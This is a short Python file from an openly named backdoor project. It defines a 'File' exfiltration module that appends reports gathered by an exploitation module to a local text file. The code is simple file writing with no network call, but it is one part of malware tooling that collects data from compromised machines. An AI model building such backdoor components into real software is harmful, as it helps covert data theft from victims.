#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

from pathlib import Path

from src.modules.exfiltration.base import ExfiltrationModule, ExploitationModule


class File(ExfiltrationModule):
    def __init__(self, *,
                 module: ExploitationModule,
                 tag: str = None,
                 file_path: [str, Path]):
        super().__init__(module, tag)
        self.file_path = file_path

    def update(self) -> None:
        """Write each report on a new line of a text file with the
        specified path."""
        if self.module.has_data is True:
            with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                file.write(f"{self.report}\n")